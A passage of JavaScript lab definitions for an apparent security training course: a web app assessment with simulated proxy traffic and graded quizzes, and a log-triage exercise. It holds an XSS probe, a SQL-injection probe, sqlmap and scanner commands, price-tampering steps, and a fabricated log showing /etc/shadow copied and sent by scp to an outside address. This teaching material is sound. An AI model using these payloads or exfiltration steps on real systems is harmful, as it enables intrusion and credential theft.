    add('GET', '/',                      200, 4128, { title: 'app.example — home' });
    add('GET', '/static/css/main.css',   200, 1284, { mime: 'CSS' });
    add('GET', '/static/js/app.js',      304, 0,    { mime: 'JS' });
    add('GET', '/login',                 200, 3214, { title: 'Login' });
    add('POST', '/login',                302, 0,    { params: true, title: 'redirect /dashboard',
      request: 'POST /login HTTP/1.1\nHost: app.example.local\nContent-Type: application/x-www-form-urlencoded\n\nusername=j.sanders&password=Spring2026!\n',
      response: 'HTTP/1.1 302 Found\nLocation: /dashboard\nSet-Cookie: PHPSESSID=8f3a1c; Path=/\n\n' });
    add('GET', '/dashboard',             200, 5921, { title: 'Dashboard' });
    add('GET', '/api/users/me',          200, 612,  { mime: 'JSON',
      response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"id":1001,"username":"j.sanders","role":"customer"}\n' });
    add('GET', '/products',              200, 8244, { title: 'Catalog' });
    for (let i = 1; i <= 12; i++) {
      add('GET', `/products/${i}`, 200, 4100 + i*7, { title: `Product ${i}` });
    }
    add('GET', '/cart',                  200, 2918, { title: 'Cart' });
    add('POST', '/cart/add',             200, 412,  { params: true, mime: 'JSON',
      request: 'POST /cart/add HTTP/1.1\nHost: app.example.local\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=8f3a1c\n\nproduct_id=4&quantity=1&price=199.00\n',
      response: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"ok":true,"cartTotal":199.00,"items":1}\n',
      responseManipulated: 'HTTP/1.1 200 OK\nContent-Type: application/json\n\n{"ok":true,"cartTotal":1.00,"items":1}\n' });
    add('GET', '/cart',                  200, 3104, { title: 'Cart (1 item)' });
    add('POST', '/checkout',             302, 0,    { params: true, title: 'redirect /thanks',
      response: 'HTTP/1.1 302 Found\nLocation: /thanks\n\n' });

    // Reflected XSS: /search?q=
    add('GET', '/search?q=phone',                 200, 4118, { params: true, title: 'Search results' });
    add('GET', '/search?q=<script>alert(1)<\/script>', 200, 4218, { params: true, title: 'Search results',
      response: 'HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body><h2>Results for: <script>alert(1)</script></h2>...\n' });

    // Admin probes (404)
    add('GET', '/admin',     404, 287, { title: 'Not Found' });
    add('GET', '/admin/',    404, 289, { title: 'Not Found' });
    add('GET', '/.git/HEAD', 404, 285, { title: 'Not Found' });
    add('GET', '/.env',      404, 281, { title: 'Not Found' });

    // SQLi indicator
    add('GET', "/products?id=1'", 500, 612, { params: true, title: 'Internal Server Error',
      response: 'HTTP/1.1 500 Internal Server Error\nContent-Type: text/html\n\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \'\'\' at line 1\n' });

    // Misc noise to round out ~80
    for (let i = 0; i < 50; i++) {
      add('GET', `/api/products?cat=${i}`, 200, 1024 + i, { params: true, mime: 'JSON' });
    }

    return JSON.stringify(rows);
  }

  function buildSa3Fs() {
    return {
      'home': { 'student': { '.bashrc': '' } },
      'var': {
        'lib': {
          'burp': {
            'http-history.json': buildSa3Burp(),
            'project-config.json': '{"proxy":{"port":8080,"host":"127.0.0.1"}}\n',
          },
          'sa': {
            'sqlmap-results.txt': 'GET parameter \'id\' is injectable.\n',
          },
        },
        'log': {},
      },
      'tmp': {},
    };
  }

  const SA3_LAB = {
    id: 'sa-3',
    track: 'security-assessments',
    title: 'Web Application Security Assessment',
    difficulty: 'Intermediate',
    estimatedTime: '60 min',
    icon: '🕸',
    tags: ['Burp Suite', 'OWASP ZAP', 'Web', 'IDOR', 'XSS', 'SQLi'],

    source: {
      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
      file: 'project-3-Web Application Security Assessment.md',
      sha256: '4e087898c76325c95d7e96122ace7d3d83b9262e97c96e54b0b58aa8eb1fa895',
      snapshot: 'src/data/sources/sa-3.source.md',
    },

    environment: { type: 'web', shell: 'BurpProxyLabShell', fs: buildSa3Fs },

    scenario: {
      role: 'AppSec analyst on the e-commerce rotation',
      incident: 'Customer reports show inconsistent prices appearing in completed orders for app.example.local. You have a captured proxy session from the testing environment. Use it to identify the class of vulnerability that allows price manipulation, and verify two other web findings flagged by automated tooling.',
    },

    exercises: [
      {
        id: 'ex1',
        upstreamHeading: 'Exercise 1: Intercepting Traffic with OWASP ZAP',
        steps: [
          {
            id: 'sa-3.ex1.s1',
            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install zaproxy' },
            kind: 'observe',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: '(Aside) ZAP is the open-source equivalent of Burp. The upstream begins with installing zaproxy. Confirm you have a terminal by pressing Enter on a blank line.',
            acceptedInputs: [{ type: 'regex', value: /^\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-3.ex1.s2',
            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'Configure browser to use ZAP proxy 127.0.0.1:8080' },
            kind: 'ui',
            instruction: 'In Burp (left), open the Proxy listener: click "Open browser" in the Proxy toolbar to point a sandboxed browser at 127.0.0.1:8080.',
            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'listener:8080'] },
            points: 5,
          },
          {
            id: 'sa-3.ex1.s3',
            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'Navigate the web app and observe intercepted requests' },
            kind: 'ui',
            instruction: 'In the HTTP history, click the row that shows POST /cart/add to inspect the captured request and response panes.',
            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'history'] },
            points: 10,
            checkOnLearning: 'sa3-q1',
          },
        ],
      },
      {
        id: 'ex2',
        upstreamHeading: 'Exercise 2: Vulnerability Scanning with Burp Suite',
        steps: [
          {
            id: 'sa-3.ex2.s1',
            upstream: { exercise: 'Exercise 2', stepNumber: 1, sourceLine: 'sudo apt-get install burpsuite' },
            kind: 'ui',
            instruction: 'Burp is already running. The title bar reads "Burp Suite Professional v2024.4". Confirm by clicking the Proxy tab.',
            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'listener:8080'] },
            points: 5,
          },
          {
            id: 'sa-3.ex2.s2',
            upstream: { exercise: 'Exercise 2', stepNumber: 2, sourceLine: 'Configure browser to use Burp proxy 127.0.0.1:8080' },
            kind: 'ui',
            instruction: 'Toggle "Intercept is off" → "Intercept is ON" so the next request can be modified before it leaves the browser.',
            validation: { type: 'uiPath', expected: ['burp', 'proxy', 'intercept'] },
            points: 5,
          },
          {
            id: 'sa-3.ex2.s3',
            upstream: { exercise: 'Exercise 2', stepNumber: 3, sourceLine: 'Right-click → Send to Repeater; modify and re-send' },
            kind: 'ui',
            instruction: 'Right-click the POST /cart/add row in HTTP history → "Send to Repeater". In Repeater, change `price=199.00` to `price=1` and click Send. Confirm the manipulated response shows cartTotal=1.00.',
            validation: { type: 'uiPath', expected: ['burp', 'send-to-repeater'] },
            points: 25,
            checkOnLearning: 'sa3-q2',
          },
        ],
      },
      {
        id: 'ex3',
        upstreamHeading: 'Exercise 3: Web Server Assessment with Nikto',
        steps: [
          {
            id: 'sa-3.ex3.s1',
            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'sudo apt-get install nikto' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Switch to a terminal and install Nikto.',
            hint: '`sudo apt-get install nikto`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?nikto\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-3.ex3.s2',
            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'nikto -h http://192.168.1.10' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Scan https://app.example.local with Nikto.',
            hint: '`nikto -h https://app.example.local`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?nikto\s+-h\s+https?:\/\/app\.example\.local\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa3-q5',
          },
        ],
      },
      {
        id: 'ex4',
        upstreamHeading: 'Exercise 4: SQL Injection Testing with SQLMap',
        steps: [
          {
            id: 'sa-3.ex4.s1',
            upstream: { exercise: 'Exercise 4', stepNumber: 1, sourceLine: 'sudo apt-get install sqlmap' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Install SQLMap.',
            hint: '`sudo apt-get install sqlmap`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?sqlmap\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-3.ex4.s2',
            upstream: { exercise: 'Exercise 4', stepNumber: 2, sourceLine: 'Identify a vulnerable parameter (e.g., /index.php?id=1)' },
            kind: 'analyze',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'In your captured proxy traffic, which endpoint produced a 500 error after appending a single quote (the classic SQLi indicator)? Submit the path with parameter, e.g. /foo?bar=1.',
            hint: 'Look for the row in your Burp HTTP history with status 500 and a "syntax error" body. The URL ended with `\'`.',
            validation: { type: 'valueExtracted', expected: ["/products?id=1'", '/products?id=1', '/products', '/products?id'] },
            points: 15,
            checkOnLearning: 'sa3-q3',
          },
          {
            id: 'sa-3.ex4.s3',
            upstream: { exercise: 'Exercise 4', stepNumber: 3, sourceLine: 'sqlmap -u "http://.../index.php?id=1" --batch --dbs' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Run sqlmap against the suspicious parameter.',
            hint: '`sqlmap -u "https://app.example.local/products?id=1" --batch --dbs`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?sqlmap\s+-u\s+["']?https?:\/\/app\.example\.local\/products\?id=1["']?(\s+--batch)?(\s+--dbs)?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 15,
          },
        ],
      },
      {
        id: 'ex5',
        upstreamHeading: 'Exercise 5: Web Application Fuzzing with Wapiti',
        steps: [
          {
            id: 'sa-3.ex5.s1',
            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'sudo apt-get install wapiti' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Install Wapiti.',
            hint: '`sudo apt-get install wapiti`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?wapiti\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-3.ex5.s2',
            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'wapiti http://192.168.1.10 -f txt -o wapiti_report.txt' },
            kind: 'command',
            environment: { shell: 'LinuxTerminalShell', shellProps: {} },
            instruction: 'Fuzz https://app.example.local and write a text report.',
            hint: '`wapiti https://app.example.local -f txt -o wapiti_report.txt`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?wapiti\s+https?:\/\/app\.example\.local(\s+-f\s+\w+)?(\s+-o\s+\S+)?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa3-q4',
          },
        ],
      },
    ],

    checkOnLearning: [
      {
        id: 'sa3-q1',
        bloom: 'recall',
        question: 'In the captured POST /cart/add request, which body parameter directly controls the per-item price the server records?',
        type: 'short-answer',
        acceptedAnswer: ['price', 'price='],
        triggerOn: { stepId: 'sa-3.ex1.s3' },
        reinforces: 'sa-3.ex1.s3',
      },
      {
        id: 'sa3-q2',
        bloom: 'application',
        question: 'You sent the request with price=1 in Repeater and the server returned cartTotal=1.00. What class of OWASP finding is this?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'Cross-Site Scripting (XSS)', correct: false },
          { id: 'b', text: 'SQL Injection', correct: false },
          { id: 'c', text: 'Insecure Direct Object Reference / Broken Access Control (parameter tampering on price)', correct: true },
          { id: 'd', text: 'CSRF', correct: false },
        ],
        triggerOn: { stepId: 'sa-3.ex2.s3' },
        reinforces: 'sa-3.ex2.s3',
      },
      {
        id: 'sa3-q3',
        bloom: 'comprehension',
        question: 'A request to /products?id=1\' returned an error message disclosing MySQL syntax. What does that primarily indicate?',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'The id parameter is concatenated unsafely into a SQL query', correct: true },
          { id: 'b', text: 'Stack traces are leaking back-end DBMS information', correct: true },
          { id: 'c', text: 'The endpoint is using parameterized queries correctly', correct: false },
          { id: 'd', text: 'sqlmap can likely exploit this further', correct: true },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-3.ex4.s2' },
        reinforces: 'sa-3.ex4.s2',
      },
      {
        id: 'sa3-q4',
        bloom: 'analysis',
        question: 'You have evidence of price-tampering IDOR, an open SQLi indicator on /products, and a reflected XSS on /search. Pick every reasonable next-day action.',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'File the IDOR as critical and ask app owners to enforce server-side price validation against the catalog', correct: true },
          { id: 'b', text: 'Disable the public site without notifying stakeholders', correct: false },
          { id: 'c', text: 'Confirm the SQLi locally then file with safe PoC, do not exfiltrate', correct: true },
          { id: 'd', text: 'Capture the XSS payload context (URL + sink) for the dev team', correct: true },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-3.ex5.s2' },
        reinforces: 'sa-3.ex5.s2',
      },
      {
        id: 'sa3-q5',
        bloom: 'comprehension',
        question: 'Nikto reported `/admin/` returning HTTP 200 and `PHPSESSID` without the HttpOnly flag. Why do those matter?',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'An exposed admin path expands the attack surface for credential stuffing or brute force', correct: true },
          { id: 'b', text: 'Missing HttpOnly raises session-cookie theft risk if XSS is present', correct: true },
          { id: 'c', text: 'A 200 response on /admin/ proves the app is fully patched', correct: false },
          { id: 'd', text: 'HttpOnly only affects TLS certificate validation', correct: false },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-3.ex3.s2' },
        reinforces: 'sa-3.ex3.s2',
      },
    ],

    completion: { requireAllSteps: true, minQuizScore: 0.8 },
  };

  // ────────────────────────────────────────────────────────────
  //  sa-4  System Log Assessment
  // ────────────────────────────────────────────────────────────
  function buildSa4AuthLog() {
    // Narrative: attacker stops auditd before privesc; password-guess + sudo abuse from temp.contractor.
    return [
      'Apr 22 08:00:01 DC-01 systemd[1]: Started Daily apt download activities.',
      'Apr 22 08:14:05 DC-01 sshd[2118]: Accepted password for j.sanders from 10.10.24.42 port 51022 ssh2',
      'Apr 22 08:14:05 DC-01 sshd[2118]: pam_unix(sshd:session): session opened for user j.sanders by (uid=0)',
      'Apr 22 08:30:11 DC-01 sshd[2188]: Accepted publickey for m.chen from 10.10.24.18 port 51100 ssh2',
      'Apr 22 09:00:33 DC-01 sudo: helpdesk-admin : TTY=pts/0 ; PWD=/home/helpdesk-admin ; USER=root ; COMMAND=/usr/bin/systemctl status sshd',
      'Apr 22 14:01:18 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:21 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:24 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:26 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:30 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:32 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:01:35 DC-01 sshd[3211]: Failed password for temp.contractor from 198.51.100.42 port 38814 ssh2',
      'Apr 22 14:02:09 DC-01 sshd[3219]: Accepted password for temp.contractor from 198.51.100.42 port 38922 ssh2',
      'Apr 22 14:02:09 DC-01 sshd[3219]: pam_unix(sshd:session): session opened for user temp.contractor by (uid=0)',
      'Apr 22 14:04:55 DC-01 sudo: temp.contractor : TTY=pts/3 ; PWD=/home/temp.contractor ; USER=root ; COMMAND=/bin/systemctl stop auditd',
      'Apr 22 14:04:56 DC-01 systemd[1]: Stopping Security Auditing Service...',
      'Apr 22 14:04:56 DC-01 systemd[1]: auditd.service: Deactivated successfully.',
      'Apr 22 14:04:56 DC-01 systemd[1]: Stopped Security Auditing Service.',
      'Apr 22 14:05:09 DC-01 sudo: temp.contractor : TTY=pts/3 ; PWD=/home/temp.contractor ; USER=root ; COMMAND=/bin/cp /etc/shadow /tmp/.cache.bak',
      'Apr 22 14:06:21 DC-01 sudo: temp.contractor : TTY=pts/3 ; PWD=/home/temp.contractor ; USER=root ; COMMAND=/usr/bin/scp /tmp/.cache.bak temp.contractor@198.51.100.42:/home/temp.contractor/',
      'Apr 22 14:42:11 DC-01 sshd[3219]: Received disconnect from 198.51.100.42 port 38922:11: disconnected by user',
      'Apr 22 14:42:11 DC-01 sshd[3219]: pam_unix(sshd:session): session closed for user temp.contractor',
    ].join('\n') + '\n';
  }

  function buildSa4Syslog() {
    return [
      'Apr 22 08:00:01 DC-01 systemd[1]: Started Daily apt download activities.',
      'Apr 22 08:14:05 DC-01 systemd-logind[833]: New session 21 of user j.sanders.',
      'Apr 22 09:00:33 DC-01 systemd[1]: Started Session 23 of user helpdesk-admin.',
      'Apr 22 14:04:56 DC-01 systemd[1]: auditd.service: Deactivated successfully.',
      'Apr 22 14:04:56 DC-01 systemd[1]: Stopped Security Auditing Service.',
      'Apr 22 14:42:11 DC-01 systemd-logind[833]: Removed session 31.',
    ].join('\n') + '\n';
  }

  function buildSa4Fs() {
    return {
      'home': { 'student': { '.bashrc': '' } },
      'etc': {
        'rsyslog.conf': '# /etc/rsyslog.conf\n# Forward all to a remote SIEM\n*.* @10.10.24.5:514\n',
        'logrotate.d': { 'custom_logs': '/var/log/custom_log {\n    daily\n    rotate 7\n    compress\n    missingok\n    notifempty\n    create 0640 root utmp\n}\n' },
        'logstash': { 'conf.d': { 'logstash.conf': 'input {\n  file { path => "/var/log/syslog" start_position => "beginning" }\n}\noutput {\n  elasticsearch { hosts => ["localhost:9200"] index => "syslog" }\n}\n' } },
      },
      'var': {
        'log': {
          'auth.log': buildSa4AuthLog(),
          'syslog':   buildSa4Syslog(),
          'auditd.journal': '-- No entries --\n',
          'kern.log': '',
        },
      },
      'tmp': {},
      'run': { 'services': {} },
    };
  }

  const SA4_LAB = {
    id: 'sa-4',
    track: 'security-assessments',
    title: 'System Log Assessment',
    difficulty: 'Intermediate',
    estimatedTime: '55 min',
    icon: '📜',
    tags: ['Rsyslog', 'Logwatch', 'Logrotate', 'Splunk', 'ELK'],

    source: {
      repo: '0xrajneesh/Security-Assessments-projects-for-Beginners',
      file: 'project-4-System Log Assessment.md',
      sha256: '914b093adfc6241772a2362be40cd01392f42a8a8a05b0983c093145773fab0d',
      snapshot: 'src/data/sources/sa-4.source.md',
    },

    environment: { type: 'linux', shell: 'LinuxTerminalShell', fs: buildSa4Fs },

    scenario: {
      role: 'SOC analyst on the log-review rotation',
      incident: 'DC-01 stopped reporting audit events to the SIEM around 14:04 yesterday. Rsyslog forwarding looks healthy. Triage /var/log/auth.log and /var/log/syslog to find why audit data went silent.',
    },

    exercises: [
      {
        id: 'ex1',
        upstreamHeading: 'Exercise 1: Configuring Centralized Logging with Rsyslog',
        steps: [
          {
            id: 'sa-4.ex1.s1',
            upstream: { exercise: 'Exercise 1', stepNumber: 1, sourceLine: 'sudo apt-get install rsyslog' },
            kind: 'command',
            instruction: 'Install rsyslog.',
            hint: '`sudo apt-get install rsyslog`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?rsyslog\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex1.s2',
            upstream: { exercise: 'Exercise 1', stepNumber: 2, sourceLine: 'Edit /etc/rsyslog.conf to forward to a remote log server' },
            kind: 'command',
            instruction: 'Read /etc/rsyslog.conf to confirm the forward rule.',
            hint: '`cat /etc/rsyslog.conf`',
            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/rsyslog\.conf\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
            checkOnLearning: 'sa4-q5',
          },
          {
            id: 'sa-4.ex1.s3',
            upstream: { exercise: 'Exercise 1', stepNumber: 3, sourceLine: 'sudo systemctl restart rsyslog' },
            kind: 'command',
            instruction: 'Restart rsyslog.',
            hint: '`sudo systemctl start rsyslog` or `restart`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+(start|restart)\s+rsyslog\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
        ],
      },
      {
        id: 'ex2',
        upstreamHeading: 'Exercise 2: Log Analysis with Logwatch',
        steps: [
          {
            id: 'sa-4.ex2.s1',
            upstream: { exercise: 'Exercise 2', stepNumber: 1, sourceLine: 'sudo apt-get install logwatch' },
            kind: 'command',
            instruction: 'Install logwatch.',
            hint: '`sudo apt-get install logwatch`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?logwatch\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex2.s2',
            upstream: { exercise: 'Exercise 2', stepNumber: 2, sourceLine: 'sudo logwatch --detail high --logfile /var/log/syslog --range today --service all --print' },
            kind: 'command',
            instruction: 'Generate a high-detail logwatch summary for today.',
            hint: '`sudo logwatch --detail high --logfile /var/log/syslog --range today --service all --print`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?logwatch\s+(--detail\s+\w+)?(\s+--logfile\s+\/var\/log\/syslog)?(\s+--range\s+\w+)?(\s+--service\s+\w+)?(\s+--print)?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa4-q2',
          },
        ],
      },
      {
        id: 'ex3',
        upstreamHeading: 'Exercise 3: Log Rotation with Logrotate',
        steps: [
          {
            id: 'sa-4.ex3.s1',
            upstream: { exercise: 'Exercise 3', stepNumber: 1, sourceLine: 'Edit /etc/logrotate.d/custom_logs' },
            kind: 'command',
            instruction: 'Read the existing custom_logs rotation policy.',
            hint: '`cat /etc/logrotate.d/custom_logs`',
            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/logrotate\.d\/custom_logs\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex3.s2',
            upstream: { exercise: 'Exercise 3', stepNumber: 2, sourceLine: 'sudo logrotate -d /etc/logrotate.d/custom_logs' },
            kind: 'command',
            instruction: 'Dry-run logrotate against the custom_logs policy.',
            hint: '`sudo logrotate -d /etc/logrotate.d/custom_logs`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?logrotate\s+-d\s+\/etc\/logrotate\.d\/custom_logs\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
        ],
      },
      {
        id: 'ex4',
        upstreamHeading: 'Exercise 4: Real-time Log Monitoring with Splunk',
        steps: [
          {
            id: 'sa-4.ex4.s1',
            upstream: { exercise: 'Exercise 4', stepNumber: 1, sourceLine: 'wget splunk .deb && sudo dpkg -i splunk.deb' },
            kind: 'command',
            instruction: 'Download the Splunk .deb package.',
            hint: '`wget https://download.splunk.com/products/splunk/releases/9.2.1/linux/splunk-9.2.1-amd64.deb`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?wget\s+https?:\/\/[^\s]+splunk[^\s]+\.deb\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex4.s2',
            upstream: { exercise: 'Exercise 4', stepNumber: 2, sourceLine: 'sudo /opt/splunk/bin/splunk start --accept-license' },
            kind: 'analyze',
            instruction: 'Page through /var/log/auth.log and identify which user account succeeded after a burst of failed passwords. Submit just the username.',
            hint: '`less /var/log/auth.log` — look for repeated "Failed password for X" then an "Accepted password for X" within seconds.',
            validation: { type: 'valueExtracted', expected: ['temp.contractor'] },
            points: 15,
            checkOnLearning: 'sa4-q1',
          },
          {
            id: 'sa-4.ex4.s3',
            upstream: { exercise: 'Exercise 4', stepNumber: 3, sourceLine: 'Add /var/log as a Splunk data source' },
            kind: 'analyze',
            instruction: 'After that login, what privileged action did the same user take to suppress audit telemetry? Submit the systemd unit name they stopped.',
            hint: 'grep auth.log for "sudo" and "stop" — look at the COMMAND= clause.',
            validation: { type: 'valueExtracted', expected: ['auditd', 'auditd.service'] },
            points: 15,
          },
        ],
      },
      {
        id: 'ex5',
        upstreamHeading: 'Exercise 5: Visualizing Log Data with the ELK Stack',
        steps: [
          {
            id: 'sa-4.ex5.s1',
            upstream: { exercise: 'Exercise 5', stepNumber: 1, sourceLine: 'sudo apt-get install elasticsearch && sudo systemctl start elasticsearch' },
            kind: 'command',
            instruction: 'Start Elasticsearch.',
            hint: '`sudo systemctl start elasticsearch`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+start\s+elasticsearch\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s2',
            upstream: { exercise: 'Exercise 5', stepNumber: 2, sourceLine: 'sudo apt-get install logstash' },
            kind: 'command',
            instruction: 'Install Logstash.',
            hint: '`sudo apt-get install logstash`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?logstash\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s3',
            upstream: { exercise: 'Exercise 5', stepNumber: 3, sourceLine: 'Configure /etc/logstash/conf.d/logstash.conf' },
            kind: 'command',
            instruction: 'Read the Logstash pipeline config.',
            hint: '`cat /etc/logstash/conf.d/logstash.conf`',
            acceptedInputs: [{ type: 'regex', value: /^(less|cat|nano)\s+\/etc\/logstash\/conf\.d\/logstash\.conf\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s4',
            upstream: { exercise: 'Exercise 5', stepNumber: 4, sourceLine: 'sudo systemctl start logstash' },
            kind: 'command',
            instruction: 'Start Logstash.',
            hint: '`sudo systemctl start logstash`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?systemctl\s+start\s+logstash\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s5',
            upstream: { exercise: 'Exercise 5', stepNumber: 5, sourceLine: 'sudo apt-get install kibana' },
            kind: 'command',
            instruction: 'Install Kibana.',
            hint: '`sudo apt-get install kibana`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?apt-get\s+install\s+(-y\s+)?kibana\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 5,
          },
          {
            id: 'sa-4.ex5.s6',
            upstream: { exercise: 'Exercise 5', stepNumber: 6, sourceLine: 'Open http://localhost:5601 in a browser to view Kibana' },
            kind: 'command',
            instruction: 'Confirm Kibana is responding on its default port.',
            hint: '`curl -s http://localhost:5601`',
            acceptedInputs: [{ type: 'regex', value: /^(sudo\s+)?(curl|wget)\s+(-s\s+)?https?:\/\/localhost:5601\/?\s*$/ }],
            validation: { type: 'commandExecuted' },
            points: 10,
            checkOnLearning: 'sa4-q3',
          },
        ],
      },
    ],

    checkOnLearning: [
      {
        id: 'sa4-q1',
        bloom: 'analysis',
        question: 'You found 7 consecutive "Failed password for temp.contractor" entries followed by an "Accepted password" within ~30s, all from 198.51.100.42. Pick every reasonable conclusion.',
        type: 'multi-select',
        options: [
          { id: 'a', text: 'The account is being brute-forced from an external (RFC 5737) IP', correct: true },
          { id: 'b', text: 'The successful login means the password was guessed or known', correct: true },
          { id: 'c', text: 'temp.contractor merely mistyped their password seven times', correct: false },
          { id: 'd', text: 'PAM lockout (pam_tally2 deny=5) is either disabled or misconfigured on this host', correct: true },
        ],
        passThreshold: 'all-correct',
        triggerOn: { stepId: 'sa-4.ex4.s2' },
        reinforces: 'sa-4.ex4.s2',
      },
      {
        id: 'sa4-q2',
        bloom: 'application',
        question: 'Your Logwatch summary still showed the key 14:04 system event even though full audit telemetry disappeared afterward. Which event best explains the gap?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'The host restarted rsyslog, interrupting remote forwarding only', correct: false },
          { id: 'b', text: 'The attacker stopped auditd, blinding host-level audit events after the sudo action', correct: true },
          { id: 'c', text: 'Logrotate compressed auth.log too early', correct: false },
          { id: 'd', text: 'Kibana on port 5601 rejected the dashboard query', correct: false },
        ],
        triggerOn: { stepId: 'sa-4.ex2.s2' },
        reinforces: 'sa-4.ex2.s2',
      },
      {
        id: 'sa4-q3',
        bloom: 'recall',
        question: 'On default Debian/Ubuntu installs, which TCP port does Kibana listen on?',
        type: 'short-answer',
        acceptedAnswer: ['5601', 'tcp/5601'],
        triggerOn: { stepId: 'sa-4.ex5.s6' },
        reinforces: 'sa-4.ex5.s6',
      },
      {
        id: 'sa4-q4',
        bloom: 'comprehension',
        question: 'The custom_logs logrotate policy specifies `rotate 7`. What does that number control?',
        type: 'single-select',
        options: [
          { id: 'a', text: 'The number of days a single rotation covers', correct: false },
          { id: 'b', text: 'The number of historical rotated copies retained', correct: true },
          { id: 'c', text: 'The compression level', correct: false },
          { id: 'd', text: 'The minimum size before rotating', correct: false },
        ],
        triggerOn: { stepId: 'sa-4.ex3.s2' },
        reinforces: 'sa-4.ex3.s2',
      },
      {
        id: 'sa4-q5',
        bloom: 'comprehension',
        question: 'The rsyslog line `*.* @10.10.24.5:514` means what?',
        type: 'single-select',
        options: [
